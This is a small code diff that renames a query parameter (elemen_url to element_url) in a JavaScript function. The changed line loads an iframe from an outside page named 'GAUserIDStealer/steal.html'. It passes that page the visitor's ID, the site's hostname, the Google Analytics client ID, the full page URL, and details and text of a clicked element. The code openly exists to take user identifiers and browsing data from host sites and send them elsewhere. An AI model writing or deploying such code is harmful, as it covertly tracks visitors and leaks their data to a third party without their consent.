@@ -130,5 +130,5 @@ function doFlow(){
         }
     }
 
-    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&elemen_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
 }
